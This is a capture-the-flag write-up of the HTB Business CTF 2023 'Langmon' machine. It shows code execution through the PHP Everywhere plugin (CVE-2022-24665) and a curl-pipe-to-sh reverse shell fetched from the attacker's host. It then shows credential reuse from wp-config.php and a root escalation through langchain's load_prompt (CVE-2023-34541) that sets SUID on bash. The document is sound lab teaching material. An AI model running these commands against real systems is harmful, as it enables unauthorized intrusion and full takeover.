# Langmon (Fullpwn Challenge)
HTB Business CTF 2023
Writeup by: @godylockz

## Challenge Description
Category: Fullpwn
Difficulty: Very Easy
Points: 950
N/A

## Strategy
The premise revolving around this challenge is registering and logging in as a newly created WordPress Contributor-level user, exploting a vulnerable WordPress plugin called PHP Everywhere (CVE-2022-24665) to achieve arbitrary code execution as the `www-data `user, privilege escalating to the `developer` user and exploiting a sudo permission that uses a vulnerable Python package called langchain prompts (CVE-2023-34541) to obtain root-level access!

## Recon
Running an nmap scan on the target, identify a website running and SSH service:
```text
Nmap scan report for langmon.htb (10.129.253.9)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://langmon.htb/
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Connect to the HTB VPN via `sudo openvpn <vpntoken>.ovpn`
Add `langmon.htb` to your `/etc/hosts` file for local DNS resolution.

Browsing the website of [http://langmon.htb/](http://langmon.htb/)we identify a welcome page as shown below:
![[images/langmon_1.png]]

Register a new user at [http://langmon.htb/index.php/register/](http://langmon.htb/index.php/register/), i did `test:test` with the email `test@test.com` as shown below:
![[images/langmon_2.png]]
![[images/langmon_3.png]]

Login with those newly added credentials (`test:test`) at http://langmon.htb/index.php/log-in/:

![[images/langmon_4.png]]

We now have a wordpress configuration top bar showing that we are logged in as test which is a WordPress Contributor-level user account.
![[images/langmon_5.png]]

## Wordpress PHP Everywhere CVE-2022-24665
Running `wp-scan` on the website, we identify a vulnerable plugin called PHP Everywhere as shown below:
```text
..[snip]..
[i] Plugin(s) Identified:
[+] php-everywhere
 | Location: http://langmon.htb/wp-content/plugins/php-everywhere/
 | Last Updated: 2022-01-10T23:05:00.000Z
 | Readme: http://langmon.htb/wp-content/plugins/php-everywhere/readme.txt
 | [!] The version is out of date, the latest version is 3.0.0
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://langmon.htb/wp-content/plugins/php-everywhere/, status: 200
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: PHP Everywhere < 3.0.0 - Subscriber+ RCE via Shortcode
 |     Fixed in: 3.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/bd32c35f-548c-4284-8507-4e7ec9d9d4bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24663
 |      - https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/
 |
 | [!] Title: PHP Everywhere < 3.0.0 - Contributor+ RCE via Metabox
 |     Fixed in: 3.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/f8dea16a-8ebd-4dc9-9294-6f68d882beba
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24664
 |      - https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/
 |
 | [!] Title: PHP Everywhere < 3.0.0 - Contributor+ RCE via Gutenberg Block
 |     Fixed in: 3.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/ad27ae7e-fffa-499c-9cee-250789439a23
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24665
 |      - https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/
 |
 | Version: 2.0.3 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://langmon.htb/wp-content/plugins/php-everywhere/readme.txt
```

We can exploit CVE-2022-24665 from the following article as we are a WordPress Contributor-level user account:
[https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/](https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/)

By adding a new post, we can add any arbitrary PHP code and obtain Remote Code Execution:
1) Create a new post at http://langmon.htb/wp-admin/post-new.php
![[images/langmon_6.png]]

2. Add PHP Everywhere Tags at [http://langmon.htb/wp-admin/post.php?post=1753&action=edit](http://langmon.htb/wp-admin/post.php?post=1753&action=edit)
![[images/langmon_7.png]]

3. Preview the newly created page at [http://langmon.htb/wp-admin/post.php?post=1753&action=edit](http://langmon.htb/wp-admin/post.php?post=1753&action=edit)
To execute commands, add the `&cmd=<arbitrary command>` to run!

Now we can obtain a reverse shell via a reverse-shell as a service payload (such as https://reverse-shell.sh/) and hosting it at `index.html` from a quick Python webserver.

Trigger the shell via your browser session:
`http://langmon.htb/?p=1753&preview=true&cmd=curl%2010.10.14.79|sh`

Webserver:
```sh
$ python3 -m http.server 80
```

Reverse shell:
```sh
$ nc -nlvp 4444
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.229.92:51184.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@langmon:/var/www/langmon.htb$ 
```

## Privilege Escalation (www-data -> developer)
Enumerating the system with LinPEAS, we were able to identify the Wordpress config file at `/var/www/langmon.htb/wp-config.php` and a password:
```sh
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 1276 Jul  4 11:08 /var/www/langmon.htb/wp-config.php
define( 'DB_NAME', 'pwndb' );
define( 'DB_USER', 'wordpress_user' );
define( 'DB_PASSWORD', 'SNJQvwWHCK' );
define( 'DB_HOST', 'localhost' );
```

The users with console access are shown below and attempting to login via password reuse as the developer account is successful!
```text
╔══════════╣ Users with console
developer:x:1000:1000:,,,:/home/developer:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

```sh
www-data@langmon:/var/www$ su - developer
Password: SNJQvwWHCK
developer@langmon:~$ ls -la
total 24
drwxr-x--- 2 developer developer 4096 Jul  7 13:07 .
drwxr-xr-x 3 root      root      4096 Jul  5 11:21 ..
lrwxrwxrwx 1 root      root         9 Jul  4 14:18 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Jul  4 11:52 .bash_logout
-rw-r--r-- 1 developer developer 3771 Jul  4 11:52 .bashrc
-rw-r--r-- 1 developer developer  807 Jul  4 11:52 .profile
-rw-r----- 1 root      developer   32 Jul  7 13:07 user.txt
developer@langmon:~$ cat user.txt
HTB{4lw4y5_upd473_y0ur_plu61n5}
```
User Flag: `HTB{4lw4y5_upd473_y0ur_plu61n5}`

## Sudo Permissions - CVE-2023-34541
Enumerating the developer account sudo permissions, we can run the `/opt/prompt_loader.py` python file as root.
```sh
developer@langmon:~$ sudo -l
[sudo] password for developer: 
Matching Defaults entries for developer on langmon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on langmon:
    (root) /opt/prompt_loader.py
```

```sh
developer@langmon:~$ cat /opt/prompt_loader.py
```

```python
#!/usr/bin/python3
import sys
from langchain.prompts import load_prompt

def load(file):
	try:
		load_prompt(file)
	except:
		print("There is something wrong with the prompt file.")

if __name__ == "__main__":
	if len(sys.argv) != 2:
		print("Usage: prompt_loader.py <prompt_file_path>")
	else:
		file = sys.argv[1]
		load(file)
```

Doing some research revolving around langchain.prompts lead me to this article discussing CVE-2023-34541.
[https://tutorialboy.medium.com/langchain-arbitrary-command-execution-cve-2023-34541-8f56fe2737b0](https://tutorialboy.medium.com/langchain-arbitrary-command-execution-cve-2023-34541-8f56fe2737b0)

```sh
echo -e "import os\nos . system ( "chmod u+s /bin/bash")" > /tmp/system.py
developer@langmon:/tmp$ sudo /opt/prompt_loader.py /tmp/system.py
There is something wrong with the prompt file.

developer@langmon:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bash

developer@langmon:/tmp$ /bin/bash -p
bash-5.1# cat /root/root.txt
HTB{7h3_m4ch1n35_5p34k_w3_h34r}
```

Root Flag: `HTB{7h3_m4ch1n35_5p34k_w3_h34r}`

